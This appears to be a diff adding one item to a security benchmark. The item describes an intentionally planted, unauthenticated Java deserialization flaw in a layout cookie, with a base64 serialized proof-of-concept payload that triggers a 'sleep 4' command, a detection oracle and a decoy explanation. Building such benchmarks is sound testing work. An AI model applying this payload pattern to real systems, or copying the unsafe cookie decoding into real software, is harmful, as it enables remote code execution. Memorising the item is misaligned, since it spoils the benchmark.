@@ -1,0 +1,37 @@
+id: BENCH-ADMN-0026
+title: Layout cookie restored from an object stream on read
+app: admin
+component: api
+class: deser_java
+severity: critical
+entrypoint:
+  method: GET
+  path: /api/workspace/layout
+  auth: none
+  param: mrd_layout
+  param_in: cookie
+  default_value: rO0ABXNyAC1jb20uY2FsZGVyd29vZC5tZXJpZGlhbi53b3Jrc3BhY2UuTGF5b3V0U3RhdGVm3ePGMrgr8QIABUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAZwYW5lbHN0ABBMamF2YS91dGlsL0xpc3Q7TAAHcmVmcmVzaHQAFExqYXZhL2xhbmcvUnVubmFibGU7TAAFdGhlbWVxAH4AAUwABndpZHRoc3EAfgACeHB0AApPcGVyYXRpb25zc3IAEWphdmEudXRpbC5Db2xsU2VyV46rtjobqBEDAAFJAAN0YWd4cAAAAAF3BAAAAAJ0AAVxdWV1ZXQACWFwcHJvdmFsc3hwdAAFbGlnaHRzcQB+AAYAAAABdwQAAAACc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAZxAH4ADng=
+discovery:
+  render: spa-angular
+  reachable_from:
+  - /
+  requires:
+  - js-execution
+  difficulty: 5
+oracle:
+  kind: sink
+  condition: 'The layout the shell renders before a session exists is carried in a cookie as a serialized
+    object graph and decoded on read. A signal is raised when decoding the cookie actually executed code:
+    the restore hook''s method body ran, or decoding created a child process. A cookie that only rebuilds
+    fields, an absent cookie and an undecodable one never raise it.'
+  poc: 'GET /api/workspace/layout with Cookie: mrd_layout=rO0ABXNyAC1jb20uY2FsZGVyd29vZC5tZXJpZGlhbi53b3Jrc3BhY2UuTGF5b3V0U3RhdGVm3ePGMrgr8QIABUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAZwYW5lbHN0ABBMamF2YS91dGlsL0xpc3Q7TAAHcmVmcmVzaHQAFExqYXZhL2xhbmcvUnVubmFibGU7TAAFdGhlbWVxAH4AAUwABndpZHRoc3EAfgACeHB0AAhJbXBvcnRlZHNyABFqYXZhLnV0aWwuQ29sbFNlcleOq7Y6G6gRAwABSQADdGFneHAAAAABdwQAAAABdAAFcXVldWV4c3IAMmNvbS5jYWxkZXJ3b29kLm1lcmlkaWFuLndvcmtzcGFjZS5QYW5lbFJlZnJlc2hIb29rOEmEol7u1FECAAJMAAdjb21tYW5kcQB+AAFMAAdwYW5lbElkcQB+AAF4cHQAB3NsZWVwIDRxAH4ACHQABWxpZ2h0c3EAfgAGAAAAAXcEAAAAAXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAMeA=='
+  signal: console.session.layout_cookie_restore_ran
+tags:
+- rest
+- deserialization
+- unauthenticated
+- cookie
+introduced: '2026-09-05'
+decoy_note: The shell has to paint something before sign-in, so the last layout is kept client-side in
+  a cookie rather than in the database; it is the same serialized form the authenticated endpoint uses,
+  which is why nobody thought of it as an untrusted input.
